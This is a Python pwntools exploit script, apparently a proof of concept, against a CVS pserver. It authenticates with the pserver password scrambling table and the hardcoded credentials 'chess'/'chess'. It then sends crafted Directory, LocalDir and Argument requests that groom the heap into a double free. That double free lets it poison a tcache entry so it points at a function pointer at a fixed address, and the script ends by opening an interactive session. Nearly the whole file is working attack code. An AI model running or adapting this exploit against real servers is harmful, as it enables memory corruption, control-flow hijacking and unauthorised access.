from pwn import *
import os
import sys
import time

shifts = [   0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  10,  11,  12,  13,  14,  15,
             16,  17,  18,  19,  20,  21,  22,  23,  24,  25,  26,  27,  28,  29,  30,  31,
            114, 120,  53,  79,  96, 109,  72, 108,  70,  64,  76,  67, 116,  74,  68,  87,
            111,  52,  75, 119,  49,  34,  82,  81,  95,  65, 112,  86, 118, 110, 122, 105,
             41,  57,  83,  43,  46, 102,  40,  89,  38, 103,  45,  50,  42, 123,  91,  35,
            125,  55,  54,  66, 124, 126,  59,  47,  92,  71, 115,  78,  88, 107, 106,  56,
             36, 121, 117, 104, 101, 100,  69,  73,  99,  63,  94,  93,  39,  37,  61,  48,
             58, 113,  32,  90,  44,  98,  60,  51,  33,  97,  62,  77,  84,  80,  85, 223,
            225, 216, 187, 166, 229, 189, 222, 188, 141, 249, 148, 200, 184, 136, 248, 190,
            199, 170, 181, 204, 138, 232, 218, 183, 255, 234, 220, 247, 213, 203, 226, 193,
            174, 172, 228, 252, 217, 201, 131, 230, 197, 211, 145, 238, 161, 179, 160, 212,
            207, 221, 254, 173, 202, 146, 224, 151, 140, 196, 205, 130, 135, 133, 143, 246,
            192, 159, 244, 239, 185, 168, 215, 144, 139, 165, 180, 157, 147, 186, 214, 176,
            227, 231, 219, 169, 175, 156, 206, 198, 129, 164, 150, 210, 154, 177, 134, 127,
            182, 128, 158, 208, 162, 132, 167, 209, 149, 241, 153, 251, 237, 236, 171, 195,
            243, 233, 253, 240, 194, 250, 191, 155, 142, 137, 245, 235, 163, 242, 178, 152 ]
def scramble( password ):
    ## The 'A' indicates the type of scrambling. There is only one type
    s = b'A'

    for x in password:
        s += chr(shifts[x]).encode('UTF-8')

    return s

def exploit(HOST, PORT, CVSBIN):
    print(f'[INFO] Connecting to {HOST}:{PORT}')

    p = remote(HOST, PORT)

    p.sendline(b'BEGIN AUTH REQUEST')
    p.sendline(b'/srv/cvsroot')
    p.sendline(b'chess')
    p.sendline(scramble(b'chess'))
    p.sendline(b'END AUTH REQUEST')
    p.sendline(b'')

    y = p.readline()

    if y != b'I LOVE YOU\n':
        print('[ERROR] Auth failed: %s' %y)
        p.close()
        exit(0)

    print('[INFO] Logged into the cvs server')

    p.sendline(b'Root /srv/cvsroot')
    p.sendline(b'')

    ## Allocate the initial buffer that will later be freed twice
    p.sendline(b'Directory a')
    p.sendline(b'')

    bigsz = 19

    ## Allocate an additional buffer that will later be used to fill in the 7th
    ## entry in the 0x30 size for the tcache bin
    p.sendline(b'LocalDir ' + b'a'*bigsz)
    p.sendline(b'')

    ## These are used to fill up the tcache bins
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'')

    p.sendline(b'LocalDir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

    
    p.sendline(b'Directory a/')
    p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    p.readline()
    p.readline()

    ## Free the buffers and fill the tcache
    p.sendline(b'expand-modules aa')

    ## At this point, the tcache 0x20 bin should be filled with 7 entries

    for i in range(11):
        p.readline()

    p.sendline(b'Directory a/')
    p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    p.readline()
    p.readline()

    ## At this point Tcache bin 0x20 has 7 blocks and there are two identical blocks stored
    ### in Fastbin 0 (0x20)
    sys.stdout.flush()

    ## The following arguments take the blocks out of the tcache bin 0x20
    p.sendline(b'Argument ' + b'a'*bigsz)
    p.sendline(b'Argument ' + b'z'*bigsz)
    p.sendline(b'Argument ' + b'y'*bigsz)
    p.sendline(b'Argument ' + b'w'*bigsz)
    p.sendline(b'Argument ' + b'b'*bigsz)
    p.sendline(b'Argument ' + b'c'*bigsz)
    p.sendline(b'Argument ' + b'd'*bigsz)

    sys.stdout.flush()
    p.sendline(b'Argument ' + b'e'*bigsz)

    ## Fastbin 0 is moved to tcache bin 0 but there are no integrity checks
    ## There should now be a double free with one block referenced in tcache bin 0x20 and the other in 
    ## fastbin 0.
    print('[INFO] fastbin was moved to tcache bin')

    ### allocate 7 blocks. The 7th can be overwritten
    p.sendline(b'Argument ' + b'p'*bigsz)
    p.sendline(b'Argument ' + b'q'*bigsz)
    p.sendline(b'Argument ' + b'r'*bigsz)
    p.sendline(b'Argument ' + b's'*bigsz)
    p.sendline(b'Argument ' + b't'*bigsz)
    p.sendline(b'Argument ' + b'u'*bigsz)

    ## Address of the function pointer
    fp = 0x4cccd0

    #Here there should be a single block in tcache bin 0x20 which is the double free buffer")
    p.sendline(b'Argument ' + struct.pack('Q', fp-0x10) + b'v'*(bigsz - 8))
    print("Overwrite has happened")
    sys.stdout.flush()

    p.sendline(b'Argument ' + b'j'*(bigsz))
    sys.stdout.flush()
    p.sendline(b'Argument ' + b'g'*bigsz)
    sys.stdout.flush()
    p.sendline(b'Argument ' + b'i'*bigsz)
    sys.stdout.flush()

    p.sendline(b'Argument ' + b'f'*(bigsz))
    sys.stdout.flush()

    p.sendline(b'Argumentx ' + struct.pack('Q', 0xdeadbeeeef) + b'\n')
    
    print('RCX=0xdeadbe')
    print('RAX=0x6767676767676767')

    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 4:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        CVSBIN = sys.argv[3]
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ and 'CVSBIN' in os.environ:
            HOST = os.environ['HOST']
            PORT = os.environ['PORT']
            CVSBIN = os.environ['CVSBIN']
        else:
            print('[USAGE] %s <target_host> <target_port> <cvs_bin_location>' %(sys.argv[0]))
            sys.exit(1)

    exploit(HOST, PORT, CVSBIN)

    exit(0)

